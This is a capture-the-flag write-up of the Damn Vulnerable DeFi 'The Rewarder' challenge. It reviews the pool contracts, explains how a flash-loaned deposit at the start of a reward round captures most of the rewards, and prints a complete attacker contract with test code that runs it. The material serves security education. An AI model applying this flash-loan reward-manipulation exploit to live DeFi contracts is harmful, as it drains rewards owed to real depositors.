## 1) Challenge

> <cite>There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.</cite>
> <cite>Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!</cite>
> <cite>You don't have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.</cite>
> <cite>Oh, by the way, rumours say a new pool has just landed on mainnet. Isn't it offering DVT tokens in flash loans?</cite> ([link](https://www.damnvulnerabledefi.xyz/challenges/5.html))

Challenge created by [@tinchoabbate](https://twitter.com/tinchoabbate).


## 2) Code Review

In this challenge there are `4` contracts: `AccountingToken.sol`, `FlashLoanerPool.sol`, `RewardToken.sol` and `TheRewarderPool.sol`.

### 2.1) `AccountingToken.sol`

This is an `ERC-20` contract with snapshots functionalities ([source code](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/contracts/the-rewarder/AccountingToken.sol)). It inherits from [ERC20Snapshot](https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#ERC20Snapshot). When created, it sets the creator of the contract with roles `DEFAULT_ADMIN_ROLE`, `MINTER_ROLE`, `SNAPSHOT_ROLE` and `BURNER_ROLE` (lines `21-24`) . These roles are then used to check if the sender has the rigth permissions to call the contract functions. For example, only the sender with role `MINTER_ROLE` can execute the `mint` function (line `28`). The `_mint` function _"creates amount tokens and assigns them to account, increasing the total supply_ (doc [here](https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#ERC20-_mint-address-uint256-)).

```solidity

contract AccountingToken is ERC20Snapshot, AccessControl {

    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    bytes32 public constant SNAPSHOT_ROLE = keccak256("SNAPSHOT_ROLE");
    bytes32 public constant BURNER_ROLE = keccak256("BURNER_ROLE");

    constructor() ERC20("rToken", "rTKN") {
        _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _setupRole(MINTER_ROLE, msg.sender);
        _setupRole(SNAPSHOT_ROLE, msg.sender);
        _setupRole(BURNER_ROLE, msg.sender);
    }

    function mint(address to, uint256 amount) external {
        require(hasRole(MINTER_ROLE, msg.sender), "Forbidden");
        _mint(to, amount);
    }

    function burn(address from, uint256 amount) external {
        require(hasRole(BURNER_ROLE, msg.sender), "Forbidden");
        _burn(from, amount);
    }

    function snapshot() external returns (uint256) {
        require(hasRole(SNAPSHOT_ROLE, msg.sender), "Forbidden");
        return _snapshot();
    }

    // Do not need transfer of this token
    function _transfer(address, address, uint256) internal pure override {
        revert("Not implemented");
    }

    // Do not need allowance of this token
    function _approve(address, address, uint256) internal pure override {
        revert("Not implemented");
    }
}

```

### 2.2) `FlashLoanerPool.sol`

This contract ([source code](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/contracts/the-rewarder/FlashLoanerPool.sol)) is responsible for providing flash loans via the `flashLoan` function:
- it prevents reintrancy by using the `nonReentrant` modifier from [ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard)
- checks if the `DVT` balance of the pool is `>=` than the amount requested (line `27`)
- checks if sender is a deployed contract (line `29`) 
- transfer the amount to the sender (line `31`)
- calls the `receiveFlashLoan` function of the sender contract (line `33`)
- finally, it checks if the amount is paid it back (line `40`)

Since there is a check at line `29`, it means we need to call this function from a contract we control.

```solidity

contract FlashLoanerPool is ReentrancyGuard {

    using Address for address;

    DamnValuableToken public immutable liquidityToken;

    constructor(address liquidityTokenAddress) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
    }

    function flashLoan(uint256 amount) external nonReentrant {
        uint256 balanceBefore = liquidityToken.balanceOf(address(this));
        require(amount <= balanceBefore, "Not enough token balance");

        require(msg.sender.isContract(), "Borrower must be a deployed contract");
        
        liquidityToken.transfer(msg.sender, amount);

        msg.sender.functionCall(
            abi.encodeWithSignature(
                "receiveFlashLoan(uint256)",
                amount
            )
        );

        require(liquidityToken.balanceOf(address(this)) >= balanceBefore, "Flash loan not paid back");
    }
}

```

### 2.3) `RewardToken.sol`

This contract ([source code](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/contracts/the-rewarder/RewardToken.sol)) represent the reward token (ERC-20 token) distributed to those who have deposited some `DVT` tokens. Like the `AccountingToken.sol` cotract, it sets the `DEFAULT_ADMIN_ROLE` and `MINTER_ROLE` to the creator of the contract (lines `18-19`) and checks that only senders with role `MINTER_ROLE` can execute the `mint` function (line `23`).

```solidity

contract RewardToken is ERC20, AccessControl {

    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

    constructor() ERC20("Reward Token", "RWT") {
        _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _setupRole(MINTER_ROLE, msg.sender);
    }

    function mint(address to, uint256 amount) external {
        require(hasRole(MINTER_ROLE, msg.sender));
        _mint(to, amount);
    }
}

```


### 2.4) `TheRewarderPool.sol`

This is the most interesting contract for this challenge ([source code](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/contracts/the-rewarder/TheRewarderPool.sol)).

```solidity

contract TheRewarderPool {

    // Minimum duration of each round of rewards in seconds
    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;

    uint256 public lastSnapshotIdForRewards;
    uint256 public lastRecordedSnapshotTimestamp;

    mapping(address => uint256) public lastRewardTimestamps;

    // Token deposited into the pool by users
    DamnValuableToken public immutable liquidityToken;

    // Token used for internal accounting and snapshots
    // Pegged 1:1 with the liquidity token
    AccountingToken public accToken;
    
    // Token in which rewards are issued
    RewardToken public immutable rewardToken;

    // Track number of rounds
    uint256 public roundNumber;

    constructor(address tokenAddress) {
        // Assuming all three tokens have 18 decimals
        liquidityToken = DamnValuableToken(tokenAddress);
        accToken = new AccountingToken();
        rewardToken = new RewardToken();

        _recordSnapshot();
    }

    /**
     * @notice sender must have approved `amountToDeposit` liquidity tokens in advance
     */
    function deposit(uint256 amountToDeposit) external {
        require(amountToDeposit > 0, "Must deposit tokens");
        
        accToken.mint(msg.sender, amountToDeposit);
        distributeRewards();

        require(
            liquidityToken.transferFrom(msg.sender, address(this), amountToDeposit)
        );
    }

    function withdraw(uint256 amountToWithdraw) external {
        accToken.burn(msg.sender, amountToWithdraw);
        require(liquidityToken.transfer(msg.sender, amountToWithdraw));
    }

    function distributeRewards() public returns (uint256) {
        uint256 rewards = 0;

        if(isNewRewardsRound()) {
            _recordSnapshot();
        }        
        
        uint256 totalDeposits = accToken.totalSupplyAt(lastSnapshotIdForRewards);
        uint256 amountDeposited = accToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);

        if (amountDeposited > 0 && totalDeposits > 0) {
            rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits;

            if(rewards > 0 && !_hasRetrievedReward(msg.sender)) {
                rewardToken.mint(msg.sender, rewards);
                lastRewardTimestamps[msg.sender] = block.timestamp;
            }
        }

        return rewards;     
    }

    function _recordSnapshot() private {
        lastSnapshotIdForRewards = accToken.snapshot();
        lastRecordedSnapshotTimestamp = block.timestamp;
        roundNumber++;
    }

    function _hasRetrievedReward(address account) private view returns (bool) {
        return (
            lastRewardTimestamps[account] >= lastRecordedSnapshotTimestamp &&
            lastRewardTimestamps[account] <= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION
        );
    }

    function isNewRewardsRound() public view returns (bool) {
        return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
    }
}

```


Let's see what each function does.

- the `constructor` creates the `AccountingToken` and the `RewardToken` contracts. The reward pool contract has all the roles specified in both contracts (`MINTER_ROLE`, `BURNER_ROLE`, ...).
It also calls the private function `_recordSnapshot` to set some variables that will be used to determine when it's time to offer rewards

- the `deposit` function does the following:
    - check if the amount deposited is `>0` (line `50`)
    - call the `mint` function of the `AccountingToken` contract to create `rTKN` tokens and sends them to the `msg.sender` (line `52`)
    - call the `distributeRewards` function to see if it's time to distribute the rewards to the `msg.sender` (line `53`)
    - check if the `msg.sender` has sent the same amount of `DVT` token to the pool (line `56`). We need first to approve the pool (by calling the `approve` function) to call the `tranferFrom` function

- the `withdraw` function does the following:
    - call the `burn` function of the `AccountingToken` contract to burn `rTKN` (line `61`)
    - send the amount of `DVT` tokens to withdraw to the `msg.sender` (line `62`)

- the `distributeRewards` is the function responsible for the logic of offering the rewards:
    - the function `isNewRewardsRound` checks if at least `5` days have been passed before the `lastRecordedSnapshotTimestamp` (lines `68-70` and `101`). If this condition is `true` (this happens at intervals of `5` or more days), then it calls the `_recordSnapshot()` function that, in turn:
        - calls the `snapshot` function from the `AccountingToken` (line `88`) to create a new snapshot
        - update the `lastRecordedSnapshotTimestamp` with the current timestamp (line `89`)
        - increment the `roundNumber` by `1` (line `90`)
    - gets the total supply of `AccountingToken` that is available at the `lastRecordedSnapshotTimestamp`  (line `72`) and the `amountDeposited` of the sender at the same timestamp (line `73`)
    - if both of the previous values are greater than `0` (line `75`), it computes the `rewards` to offer by dividing `amountDeposited` with `lastRecordedSnapshotTimestamp`
    - it checks if the `msg.sender` has already retrieved the reward by checking the value of the variable `lastRewardTimestamps` (line `78` and `95-96`)
    - if the sender has not retrieved the reward yet and the `rewards` to offer is greater than `0`, then it calls the `mint` function of the `RewardingToken` contract to send these reward tokens to the sender
    - finally, it updates `lastRewardTimestamps` for the `msg.sender` with the block timestamp of when the reward is received

#### How can we call the deposit function?

To be eligible for some rewards, we need first to have some `rTKN` (`AccountingToken`). We can obtain some by calling the `deposit` function, but we don't have any `DVT` tokens, so we cannot approve any token transfer. 
However, we can use the `flashLoan` function to receive some `DVT` tokens as long as we pay them back. 
So, to deposit some `DVT` tokens and receive some `rTKN` tokens (1:1 ratio), we need first to call the `flashLoan` function and then approve the pool to spend our token.
We need a contract that implements the `receiveEthers` function that the `flashLoan` function will call.

#### How to get the reward?

Rewards are distributed if `5` or more days passed from the previous round. To "move in time" and avoid waiting `5` days, we can use 
the following function from the `ethers` library: `await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60])`.
This way, when we will call the `deposit` function, the function `isNewRewardsRound()` will return `true`.
Also, since we haven't retrieved any reward in that round and the value `amountDeposited` is greater than `0`, both the conditions at lines `75` and `78` will be `true`, and thus, we will receive the rewards (line `79`).

#### How to repay the flash loan?

We don't have to forget to send back the `DVT` received by the `FlashLoanerPool`. Since we had deposited the token received (when we called the `deposit` function), we need to call the `withdraw` function to receive back these `DVT` tokens so we can, in turn, send them back to the loaner pool. 

Finally, we can transfer the `rewards` received to our attacker's address and solve the challenge.



## 3) Solution

Here is a summary of how the solution works:
1) our contact calls the `flashLoan` function with an `amount` equal to the ETH pool balance (`1000000` DVT - challenge config [here](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/the-rewarder/the-rewarder.challenge.js#L9)) 
2) the `flashLoan` function will call our `receiveFlashLoan` function sending `1000000` DVT to our contract
3) inside the `receiveFlashLoan` function, since we have some DVT, we approve the `TheRewarderPool` to spend the whole amount
4) then, we call the `deposit` function with the whole amount
5) the `deposit` function will call the `distributeRewards()` function, and since all the conditions are satisfied, the `mint` function of the reward token will be called; this way, we have received some reward tokens
6) once the execution of the `deposit` function is completed, we need to withdraw the `DVT` tokens deposited because we need to repay the flash loan; to get back the `DVT`, we need to call the `withdraw` function from the `TheRewarderPool` contract
7) once we have received the `DVT` tokens back, we can send (using the `transfer` function) the initial amount of `DVT` tokens to the flash loan contract to repay the flash loan
8) finally, we transfer the rewards tokens received from our contract to the attacker's address

I've added some `require` calls to keep track of the balance of the different contracts.

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ILoanerPool {
  function flashLoan(uint256 amount) external;
}

interface IRewarderPool {
  function deposit(uint256 amountToDeposit) external;
  function withdraw(uint256 amountToWithdraw) external;
}

interface IDamnValuableToken {
  function transfer(address to, uint256 amount) external returns (bool);
  function balanceOf(address account) external returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool); 
}

interface IAccountingToken {
  function balanceOf(address account) external returns (uint256);
}

interface IRewardToken {
  function transfer(address to, uint256 amount) external returns (bool);
  function balanceOf(address account) external returns (uint256);
}
/**
 * @title AttackRewarder
 */
contract AttackRewarder {

    ILoanerPool flashLoanerPool;
    IRewarderPool rewarderPool;
    IDamnValuableToken token;
    IAccountingToken accToken;
    IRewardToken rewardToken;

    uint256 private amount;

    constructor(address _loaner, address _rewarder, address _accounting, address _reward, address _token) {
        flashLoanerPool = ILoanerPool(_loaner);
        rewarderPool = IRewarderPool(_rewarder);
        token = IDamnValuableToken(_token);
        accToken = IAccountingToken(_accounting);
        rewardToken = IRewardToken(_reward);

        amount = token.balanceOf(address(flashLoanerPool));
    }

    function run(address _attacker) public {

      flashLoanerPool.flashLoan(amount);

      bool result = rewardToken.transfer(_attacker, rewardToken.balanceOf(address(this)));
      require(result, "Rewards not sent to the attacker");
    }

    function receiveFlashLoan(uint256) external {
      require(token.balanceOf(address(flashLoanerPool)) == 0, "Pool should not have any DVT");
      require(token.balanceOf(address(this)) == 1000000 ether, "Not enough DVT tokens");
      require(rewardToken.balanceOf(address(this)) == 0, "We should not have any RWT token");
      require(accToken.balanceOf(address(this)) == 0, "We should not have any rTKN token");

      // approve the rewarder pool
      token.approve(address(rewarderPool), amount);   
      
      // deposit the DVT tokens, receive rTKN (accounting) and RWT (reward) tokens
      rewarderPool.deposit(amount);
      
      require(token.balanceOf(address(this)) == 0, "We haven't deposited all the DVT token");
      require(rewardToken.balanceOf(address(this)) > 0, "We should have received the reward");
      require(accToken.balanceOf(address(this)) == 1000000 ether, "Not enough rTKN tokens");

      // get the DVT tokens back
      rewarderPool.withdraw(amount);

      require(token.balanceOf(address(this)) == 1000000 ether, "Not enough DVT tokens to pay back the loan");
      require(accToken.balanceOf(address(this)) == 0, "We should have withdrawn all the rTNK tokens");
      
      // send back the DVT tokens to the pool
      token.transfer(address(flashLoanerPool), amount);

      require(token.balanceOf(address(this)) == 0, "We haven't paid the loan back");


    }

    receive() external payable {}

}

```

`the-rewarder.challenge.js`:

```solidity

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]) // 5 days

        const attack = await (await ethers.getContractFactory('AttackRewarder', deployer)).deploy(
            this.flashLoanPool.address, 
            this.rewarderPool.address, 
            this.accountingToken.address, 
            this.rewardToken.address, 
            this.liquidityToken.address
        );
        
        await attack.connect(attacker).run(attacker.address);

    });

```

You can find the complete code [here](https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/test/the-rewarder/the-rewarder.challenge.js) and [here](https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/contracts/attacker-contracts/AttackRewarder.sol).

## 4) References

- [ERC20Snapshot](https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#ERC20Snapshot)
- [ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard)